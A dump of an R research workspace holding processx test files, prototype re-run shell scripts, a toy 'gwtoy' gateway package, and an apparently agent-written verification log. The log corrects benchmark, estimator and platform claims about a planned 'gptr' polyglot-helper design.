  expect_equal(base64_encode(charToRaw("foobar")), "Zm9vYmFy")
  expect_equal(base64_encode(charToRaw(" ")), "IA==")
  expect_equal(base64_encode(charToRaw("")), "")

  x <- charToRaw(paste(sample(letters, 10000, replace = TRUE), collapse = ""))
  expect_equal(base64_decode(base64_encode(x)), x)

  for (i in 5:32) {
    mtcars2 <- unserialize(base64_decode(base64_encode(
      serialize(mtcars[1:i, ], NULL)
    )))
    expect_identical(mtcars[1:i, ], mtcars2)
  }
})
````

### `px390/processx/tests/testthat/test-wait.R`

````r
test_that("no deadlock when no stdout + wait", {
  skip("failure would freeze")

  p <- process$new("seq", c("1", "100000"))
  p$wait()
})

test_that("wait with timeout", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "3"))
  expect_true(p$is_alive())

  t1 <- proc.time()
  p$wait(timeout = 100)
  t2 <- proc.time()

  expect_true(p$is_alive())
  expect_true((t2 - t1)["elapsed"] > 50 / 1000)
  expect_true((t2 - t1)["elapsed"] < 3000 / 1000)

  p$kill()
  expect_false(p$is_alive())
})

test_that("wait after process already exited", {
  px <- get_tool("px")

  pxs <- replicate(20, process$new(px, c("outln", "foo", "outln", "bar")))
  rm(pxs)

  p <- process$new(
    px,
    c("outln", "foo", "outln", "bar", "outln", "foobar")
  )
  on.exit(p$kill(), add = TRUE)

  ## Make sure it is done
  p$wait()

  ## Now wait() should return immediately, regardless of timeout
  expect_true(system.time(p$wait())[["elapsed"]] < 1)
  expect_true(system.time(p$wait(3000))[["elapsed"]] < 1)
})

test_that("no fd leak on unix", {
  skip_on_cran()
  skip_on_os("solaris")
  if (is_windows()) {
    return(expect_true(TRUE))
  }
  skip_on_covr()

  # We run this test in a subprocess, so we can send an interrupt to it
  # We start a subprocess (within the subprocess) and wait on it.
  # Then the main process, after waiting a second so that everything is
  # set up in the subprocess, sends an interrupt. The suprocess catches
  # this interrupts and copies everything back to the main process.

  rs <- callr::r_session$new()
  on.exit(rs$close(), add = TRUE)

  rs$call(function() {
    fd1 <- ps::ps_num_fds(ps::ps_handle())
    p <- processx::process$new("sleep", "3", poll_connection = FALSE)
    err <- tryCatch(ret <- p$wait(), interrupt = function(e) e)
    fd2 <- ps::ps_num_fds(ps::ps_handle())
    list(fd1 = fd1, fd2 = fd2, err = err)
  })

  Sys.sleep(1)
  rs$interrupt()
  rs$poll_io(1000)
  res <- rs$read()

  expect_equal(res$result$fd1, res$result$fd2)
  expect_s3_class(res$result$err, "interrupt")
})
````

### `run_all.sh`

````sh
#!/bin/sh
# Final re-run of every G5 prototype (C locale, Rscript --vanilla). Outputs go to final/.
cd "$(dirname "$0")"
mkdir -p final
export RETICULATE_PYTHON=/opt/homebrew/bin/python3
pkill -f 'sleep 3[0-8]' 2>/dev/null
for s in p01_probes p02_encoding p04d_killtree2 p04e_kill p04_sh p05_bg_interrupt p06_py p06b_sticky p07_sql_knit p08_classify p09_history p12_declarations p13_echo p03_collisions p10_tokens p11_calibrate; do
  echo "=== $s $(date +%H:%M:%S)" >> final/_log.txt
  Rscript --vanilla $s.R > final/$s.out 2> final/$s.err
  echo "    exit $?" >> final/_log.txt
  pkill -f 'sleep 3[0-8]' 2>/dev/null
done
LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 Rscript --vanilla p02_encoding.R > final/p02_encoding_UTF8.out 2>&1
echo "=== done $(date +%H:%M:%S)" >> final/_log.txt
````

### `run_final2.sh`

````sh
#!/bin/sh
cd "$(dirname "$0")"
export RETICULATE_PYTHON=/opt/homebrew/bin/python3
pkill -f 'sleep 3[0-8]' 2>/dev/null
for s in p04_sh p05_bg_interrupt p13_echo p09_history p10_tokens p11_calibrate; do
  echo "=== $s $(date +%H:%M:%S)" >> final/_log2.txt
  Rscript --vanilla $s.R > final/$s.out 2> final/$s.err
  echo "    exit $?" >> final/_log2.txt
  pkill -f 'sleep 3[0-8]' 2>/dev/null
done
echo "=== done $(date +%H:%M:%S)" >> final/_log2.txt
````

### `toy/gwtoy.Rcheck/00_pkg_src/gwtoy/R/gw.R`

````r
helpers = new.env(parent = emptyenv())
helpers$sh = function(cmd) paste("would run:", cmd)
helpers$py = function(code) paste("would eval python:", code)

gw = structure(function(...) {
  cl = match.call()
  paste("gateway called with", length(cl) - 1L, "argument(s)")
}, class = c("gw_gateway", "function"))

`$.gw_gateway` = function(x, name) {
  f = helpers[[name]]
  if (is.null(f)) stop("no helper named ", name, call. = FALSE)
  f
}
`[[.gw_gateway` = function(x, i, ...) `$.gw_gateway`(x, i)
print.gw_gateway = function(x, ...) {
  cat("<gw gateway> helpers:", paste(sort(ls(helpers)), collapse = ", "), "\n")
  invisible(x)
}
.DollarNames.gw_gateway = function(x, pattern = "") grep(pattern, ls(helpers), value = TRUE)

internal_use = function() gw$sh("git status")
````

### `toy/gwtoy.Rcheck/00_pkg_src/gwtoy/tests/test-gw.R`

````r
stopifnot(identical(gwtoy::gw$sh("x"), "would run: x"))
stopifnot(is.function(gwtoy::gw))
stopifnot(identical(gwtoy::gw("a", "b"), "gateway called with 2 argument(s)"))
````

### `toy/gwtoy.Rcheck/00install.out`

````text
* installing *source* package 'gwtoy' ...
** using staged installation
** R
** byte-compile and prepare package for lazy loading
** help
*** installing help indices
** building package indices
** testing if installed package can be loaded from temporary location
** testing if installed package can be loaded from final location
** testing if installed package keeps a record of temporary installation path
* DONE (gwtoy)
````

### `toy/gwtoy.Rcheck/gwtoy-Ex.R`

````r
pkgname <- "gwtoy"
source(file.path(R.home("share"), "R", "examples-header.R"))
options(warn = 1)
base::assign(".ExTimings", "gwtoy-Ex.timings", pos = 'CheckExEnv')
base::cat("name\tuser\tsystem\telapsed\n", file=base::get(".ExTimings", pos = 'CheckExEnv'))
base::assign(".format_ptime",
function(x) {
  if(!is.na(x[4L])) x[1L] <- x[1L] + x[4L]
  if(!is.na(x[5L])) x[2L] <- x[2L] + x[5L]
  options(OutDec = '.')
  format(x[1L:3L], digits = 7L)
},
pos = 'CheckExEnv')

### * </HEADER>
library('gwtoy')

base::assign(".oldSearch", base::search(), pos = 'CheckExEnv')
base::assign(".old_wd", base::getwd(), pos = 'CheckExEnv')
cleanEx()
nameEx("gw")
### * gw

flush(stderr()); flush(stdout())

base::assign(".ptime", proc.time(), pos = "CheckExEnv")
### Name: gw
### Title: Gateway That Is Also a Helper Namespace
### Aliases: gw

### ** Examples

gw("hello")
gw$sh("git status")
gw[["py"]]("1 + 1")
gw



base::assign(".dptime", (proc.time() - get(".ptime", pos = "CheckExEnv")), pos = "CheckExEnv")
base::cat("gw", base::get(".format_ptime", pos = 'CheckExEnv')(get(".dptime", pos = "CheckExEnv")), "\n", file=base::get(".ExTimings", pos = 'CheckExEnv'), append=TRUE, sep="\t")
### * <FOOTER>
###
cleanEx()
options(digits = 7L)
base::cat("Time elapsed: ", proc.time() - base::get("ptime", pos = 'CheckExEnv'),"\n")
grDevices::dev.off()
###
### Local variables: ***
### mode: outline-minor ***
### outline-regexp: "\\(> \\)?### [*]+" ***
### End: ***
quit('no')
````

### `toy/gwtoy.Rcheck/tests/test-gw.R`

````r
stopifnot(identical(gwtoy::gw$sh("x"), "would run: x"))
stopifnot(is.function(gwtoy::gw))
stopifnot(identical(gwtoy::gw("a", "b"), "gateway called with 2 argument(s)"))
````

### `toy/gwtoy/R/gw.R`

````r
helpers = new.env(parent = emptyenv())
helpers$sh = function(cmd) paste("would run:", cmd)
helpers$py = function(code) paste("would eval python:", code)

gw = structure(function(...) {
  cl = match.call()
  paste("gateway called with", length(cl) - 1L, "argument(s)")
}, class = c("gw_gateway", "function"))

`$.gw_gateway` = function(x, name) {
  f = helpers[[name]]
  if (is.null(f)) stop("no helper named ", name, call. = FALSE)
  f
}
`[[.gw_gateway` = function(x, i, ...) `$.gw_gateway`(x, i)
print.gw_gateway = function(x, ...) {
  cat("<gw gateway> helpers:", paste(sort(ls(helpers)), collapse = ", "), "\n")
  invisible(x)
}
.DollarNames.gw_gateway = function(x, pattern = "") grep(pattern, ls(helpers), value = TRUE)

internal_use = function() gw$sh("git status")
````

### `toy/gwtoy/tests/test-gw.R`

````r
stopifnot(identical(gwtoy::gw$sh("x"), "would run: x"))
stopifnot(is.function(gwtoy::gw))
stopifnot(identical(gwtoy::gw("a", "b"), "gateway called with 2 argument(s)"))
````

## Verification log

Verdict: **sound_after_corrections** (26 claims checked).

The report file does not exist, so there was nothing to edit in place. I verified the G5 section of 00-digest.md, the only copy, and left the digest unedited because the orchestrator owns it. It should apply the corrections above when it writes dev/research/G5-polyglot-glue-helpers.md and append the log below. I re-ran all 14 prototypes with Rscript --vanilla in the C locale (p01-p13 plus p03 and p11), working in a copy (verify-G5/copy): every one exited 0 with no FAIL lines. Outputs match the originals except timing, PIDs and paths. p10 totals moved slightly (A 45130, B 7626, C 1970) because rg output includes file paths. The ratios hold at 5.9x and 22.9x.

## Verification log
1. processx::run()'s make_buffer() uses cat(), which corrupts non-ASCII output in the C locale on 3.8.6 and 3.9.0. CONFIRMED. Source: processx 3.9.0 R/utils.R:313-319 and a deparse of 3.8.6. p02 re-run under both versions shows 'caf<U+00E9' truncated to 10 bytes; process$new with stdout redirected to a file gives correct UTF-8.
2. run()'s interrupt handler calls invokeRestart("abort"). CONFIRMED. Source: processx 3.9.0 R/run.R:381-382 and deparse(processx::run) on 3.8.6.
3. $kill() signals the process group, and kill_tree() alone is insufficient on macOS. CONFIRMED. Source: src/unix/processx.c:147 (setsid) and :1063 (kill(-pid, SIGKILL)). The p04d and p04e re-runs show kill_tree killed 0 pids for /bin/bash and /bin/sleep (environ unreadable), while p$kill() left nothing behind. Note also that tools::pskill(-pid) returned FALSE and did not kill the group.
4. setsid grandchildren escape on every platform. UNCERTAIN (macOS only). See the corrections.
5. The classed-closure gateway (gptr$sh and friends) passes R CMD check --as-cran. CONFIRMED. Source: G5/toy/check.log, 3 benign NOTEs (new submission, future timestamps, utils import unused), and examples and tests are OK.
6. Name collisions: py, sql, run, knit, exec, bash and tool are taken; tools is a base package. CONFIRMED. Source: getNamespaceExports for reticulate, dplyr, dbplyr, purrr, rlang, devtools, ellmer, knitr, processx, callr and rmarkdown (all TRUE). A live r-universe search exports:run returned 60 packages, 38 of them on CRAN. The per-spelling token difference of at most 1 is confirmed by p14_names.out.
7. knitr has 52 engines, the bash engine runs system2('bash','-c ...') with no timeout, and it prints a 'running:' message. CONFIRMED on knitr 1.51 and on 1.52 in a scratch lib. Source: knit_engines$get(), and deparse(eng_interpreted) contains no 'timeout' anywhere in the namespace.
8. knitr {python} chunks share reticulate's __main__. CONFIRMED. Source: p06 re-run, '[PASS] knitr python chunk sees objects created by gptr$py'.
9. Token table totals (45140 / 7592 / 1967; A2 525) and the ratios (5.9x, 22.9x). CONFIRMED by arithmetic and re-run. Totals vary by less than 0.5% with paths.
10. B costs 3-6% more in T4 and T6. WRONG: T4 is +27%. Corrected.
11. Frugal bash matches C. REFINED: A2 525 vs C 1472 on the same tasks. Corrected.
12. The <polyglot> section costs 297 tokens. CONFIRMED (rtiktoken 0.0.7, o200k_base, on polyglot_section.txt). Pi's bash schema plus snippet costs 125. CONFIRMED, but the current Pi adds about 27 tokens of bash-conditional rules. Corrected.
13. Truncation notice costs 30 tokens against 69 with a temp path. APPROXIMATE: re-measured 26 vs 64.
14. The estimator was fitted on about 100k tokens. CORRECTED: about 49.5k fit and 49.6k test, with nonascii fixed at 1/3. The +70% CJK figure is CONFIRMED.
15. stderr gets at most 25% of the budget. REFINED: 200-token floor and 100-token stdout floor. Corrected.
16. PowerShell -Command maps other exit codes to 1 ('add exit $LASTEXITCODE'), and -EncodedCommand takes base64 of UTF-16LE. CONFIRMED. Source: learn.microsoft.com about_Pwsh (7.6) and about_PowerShell_exe (5.1).
17. BatBadBut CVEs. CONFIRMED. Source: NVD API. CVE-2024-24576 is Rust std before 1.77.2, which did not escape arguments to .bat/.cmd files on Windows. CVE-2024-27980 is Node.js child_process.spawn/spawnSync batch-file injection even with the shell option off.
18. The Windows command line is limited to 32,767 characters. CONFIRMED. Source: CreateProcessW docs, 'maximum length of this string is 32,767 characters, including the Unicode terminating null character'.
19. Claude Code's default timeout is 120 s, and timeouts move to the background. CONFIRMED. Source: code.claude.com/docs/en/tools-reference ('BASH_DEFAULT_TIMEOUT_MS ... two minutes'; 'When a command reaches its timeout without finishing, Claude Code moves it to the background instead of stopping it, unless the command starts with sleep'). Pi has no default timeout. CONFIRMED (pi bash.ts:42, where timeout is optional). Codex allows about 10k. CONFIRMED (Codex models catalog truncation_policy {mode: tokens, limit: 10000}, from scratch/work/track08/models_catalog.json).
20. acceptEdits parity. CONFIRMED for mkdir, touch, mv and cp; redirects are not documented. Corrected.
21. reticulate binds one Python per session, and a later request fails. CONFIRMED by a live test: use_python('/usr/bin/python3', required = TRUE) after initialisation raised 'failed to initialize requested version of Python'. reticulate's uv provisioning exists. CONFIRMED (py_require docs; uv_get_or_create_env and related internals in 1.46.0).
22. duckdb registration is zero-copy. PARTIAL: registration does not copy, but the next in-place edit copies once. Corrected.
23. p09's Rmd conversion keeps bash as gptr$sh. CONTRADICTED by the prototype, which emits {bash}. Corrected.
24. The Windows fallback to system.codepage. UNCERTAIN: that is the ANSI code page, not OEM. Corrected.
25. D-03 lists 'shell (off by default)' and S-4 says 'No bash tool'. CONFIRMED. Source: spec/01-decision-register.md:89-95 and spec/00-vision-brief.md:17.
26. Supervisor fifos are fatal in CRAN examples. CONFIRMED by report 13's verified check; not re-run here.

Overall: the load-bearing engineering claims hold up under re-execution and source reading. These are the processx run() defects, group kill versus kill_tree, the gateway pattern passing CRAN checks, the name collisions, knitr engine behaviour, the reticulate constraints and the PowerShell, CVE and CreateProcess facts. The corrections are all about the size or scope of benchmark and estimator statements, plus one prototype that contradicts the recommendation. None of them overturns a design decision.

Corrections (apply these over the summary above):

- **Was:** TOKEN TABLE note: 'Where outputs are small (T4, T6), B costs 3-6% more. In T4 that is because gptr shows all 12 pandas columns, where pandas' default print hides 4.'
  **Now:** B costs about 3% more only in T6 (180 vs 174 tokens, +3.4%). In T4, B costs 27% more (381 vs 299). The cause is right: pandas' default print, not attached to a terminal, hid columns 5-8 behind '...', while gptr$py showed all 12. Suggested text: 'Where outputs are small, B costs more: +3% in T6 (180 vs 174) and +27% in T4 (381 vs 299), where gptr shows all 12 pandas columns and pandas' default print hides 4.'
  _Source: G5/final/p10_tokens.out rows T4_python A/B and T6_download A/B; transcripts in G5/p10_tokens.rds ('T4_python A' result shows '4 ...' elision and '[4 rows x 12 columns]'); arithmetic 381/299 = 1.274_
- **Was:** 'Frugal bash matches C on pure text filtering.' (with the Risks line 'frugal bash achieves similar numbers on text filtering')
  **Now:** Frugal bash (A2) was at or below C on all four tasks where it was measured: T1 89 vs 934, T3 132 vs 196, T7 100 vs 113, T8 204 vs 229. That is 525 vs 1472 tokens in total, and 525 vs 5507 for B. C sometimes shows more content (T1 C includes a diff excerpt), so the tasks are not strictly like-for-like. R's measured advantage is therefore in default budgets, results kept as objects, cross-language data and round trips, not in text filtering. The report should say that frugal bash matches or beats C there.
  _Source: G5/final/p10_tokens.out; transcripts 'T1_git A2' / 'T1_git C' / 'T3_rg A2' / 'T3_rg C' in p10_tokens.rds_
- **Was:** Risks: 'The token estimator was fitted on an ASCII corpus of about 100k o200k tokens.' Design: 'six coefficients shipped in R'.
  **Now:** The corpus is about 99k tokens split 50/50. Five coefficients (alpha, digit, space, punct, newline) were fitted by lm() on the fit half, about 49.5k tokens, and validated on the other half, about 49.6k tokens (fitted median error about 0%, p95 |err| about 19%). The sixth coefficient, nonascii = 1/3, is fixed by assumption and not fitted. The +70% CJK overestimate is confirmed (o200k 199 vs fitted 338; 340 on my re-run). Coefficients drift slightly between runs, and g5_helpers.R ships an older set (0.1355, 0.8104, 0.0938, 0.677, 1.6367), so the dev refit script is the source of truth.
  _Source: G5/p11_calibrate.R (fit_idx, co = c(pmax(coef(fit),0), nonascii = 1/3)); G5/final/p11_calibrate.out vs verify-G5/copy/final/p11_calibrate.out; G5/g5_helpers.R line 17_
- **Was:** Output view: 'A [stderr] section gets at most 25% of the budget; unused stderr budget goes to stdout.'
  **Now:** In the prototype, stderr gets max(200, floor(0.25 x budget)) tokens, with a head fraction of 0.2 and a tail of 0.8. Stdout gets max(100, budget - stderr_used). Below about 800 tokens, stderr can therefore take more than 25%, and for very small budgets such as max_tokens = 80 or 120 the total view can exceed the budget. The spec should state both floors, or drop them if the budget must be a hard cap.
  _Source: G5/g5_helpers.R format.gptr_cmd (lines ~406-415)_
- **Was:** SQL: 'data frames are queried in an in-memory duckdb by zero-copy registration'. Risks: 'Handing objects to Python via reticulate can make R's next in-place edit copy a multi-GB object once'.
  **Now:** duckdb registration itself does not copy: the address is unchanged, PASS. In the same prototype, however, the next in-place edit of the registered frame did copy once ('next in-place edit of big$v copies: TRUE'). p06b shows the same effect for list(v) inside a closure. This is R reference counting on objects passed through a bridge's ... arguments, not something specific to reticulate. The risk and the documentation note should cover gptr$sql(name = df) as well as gptr$py(name = obj).
  _Source: G5/final/p07_sql_knit.out and verify-G5/copy/final/p07_sql_knit.out ('[PASS] column vector not copied by registration' / 'next in-place edit of big$v copies: TRUE'); G5/final/p06b_sticky.out_
- **Was:** Model prompt: 'Pi's bash tool schema plus snippet costs 125.'
  **Now:** The figure is right for what it counts: 110 tokens of wire JSON plus 15 for the snippet, and the schema and description match the current Pi clone exactly. With Pi's default tools (read, bash, edit, write), the current Pi clone also adds two bash-conditional rule lines to the system prompt: 'Use bash for file operations like ls, rg, find' (12 tokens, added when grep, find and ls are absent) and the PI_* environment guideline (15 tokens, since exposeSessionEnvironment defaults to true). Pi's bash-attributable declaration is therefore about 152 tokens, against 297 for gptr's <polyglot> section.
  _Source: pi clone (HEAD 1b34779) packages/coding-agent/src/core/tools/bash.ts lines 40-48, 258; src/core/system-prompt.ts buildRules lines 80-116; src/core/settings-manager.ts:213 DEFAULT_TOOL_NAMES; rtiktoken 0.0.7 o200k_base counts_
- **Was:** Risks: 'setsid grandchildren escape on every platform.'
  **Now:** Downgrade to UNCERTAIN. This was observed only on macOS, where a start_new_session grandchild /bin/sleep survived both the group kill and kill_tree(), because SIP-protected platform binaries' environ is unreadable (kill_tree killed 0 pids for /bin/bash and /bin/sleep). On Linux, kill_tree() finds descendants by the inherited PROCESSX_<id> environment marker, so a setsid grandchild that keeps its environment should be caught. That case is untested. Windows is also untested.
  _Source: verify-G5 re-run of G5/p04e_kill.R and p04d_killtree2.R (processx 3.8.6 and 3.9.0); processx 3.9.0 R/process.R lines 104-110 ('On macOS, system restrictions may prevent reading other processes' environment')_
- **Was:** History document: 'Bash stays as gptr$sh by default' / 'Keep shell calls as gptr$sh by default.'
  **Now:** The recommendation stands, but the prototype does the opposite. p09_history.R's native_chunk() turns a literal gptr$sh("quarto render report.qmd") into a ```{bash}``` chunk (output line 1 of the .Rmd section). Implementers must not copy that branch. The report should flag p09 as diverging from the recommended default.
  _Source: G5/p09_history.R line 63; G5/final/p09_history.out_
- **Was:** Windows notes: 'Decode UTF-8, else fall back to CP<l10n_info()$system.codepage>.'
  **Now:** Mark this UNCERTAIN. R's documentation defines system.codepage as the Windows system ANSI code page (for example 1252), added in R 4.1.0. Console programs often write in the OEM code page (for example 437 or 850) when redirected. The fallback would then mis-decode accented output from argv-form console programs that do not go through the 'chcp 65001' cmd wrapper. The fallback probably needs GetConsoleOutputCP/OEMCP handling, which already appears among the report's open questions.
  _Source: ?l10n_info (R 4.4.3): 'system.codepage: integer: the Windows system/ANSI codepage'_
- **Was:** Open question: 'Should edits mode auto-approve workspace-internal file commands (cp, mv, touch, redirects), matching Claude's acceptEdits?'
  **Now:** Claude Code's docs list mkdir, touch, mv and cp: acceptEdits 'Automatically accepts file edits and common filesystem commands such as mkdir, touch, mv, and cp for paths in the working directory or additionalDirectories'. The docs do not mention redirects, so replace 'redirects' with 'mkdir' to claim parity.
  _Source: https://code.claude.com/docs/en/permissions.md (line 73, fetched 2026-09-29)_

Unverifiable:

- The WindowsApps python stub exits with code 9009 and 'py -3' is preferable: no Windows host was available, and WebSearch/WebFetch hit a session limit.
- The taskkill /F /T /PID ordering (the parent must still be alive) and Windows job-object behaviour were not executed; only static reasoning supports them.
- Every Windows argv construction is unexecuted (PowerShell -EncodedCommand plus the exit postfix, cmd /d /s /c with windows_verbatim_args, the Git Bash discovery paths, the BatBadBut refusal logic). The underlying documented facts were confirmed, but not their implementation.
- The '30 tokens against 69 with a temp path' truncation notice figures: re-measuring gave 26 against 64. The counts depend on the numbers and the tempdir path, so only the rough 2.3-2.5x ratio holds.
- The claim that variant C savings hold with a live model was not tested: no paid calls were made, as the report itself says.
- The fifo claim ('supervisor fifos are fatal in CRAN examples') was not re-run here. It rests on report 13's verified R CMD check --as-cran failure ('connections left open ... supervisor_stdin (fifo)').
- Version drift: CRAN now has reticulate 1.47.0, knitr 1.52, duckdb 1.5.6 and rtiktoken 0.11.0.3. Only knitr 1.52 was re-checked (still 52 engines, still no timeout in eng_interpreted); the others were not.
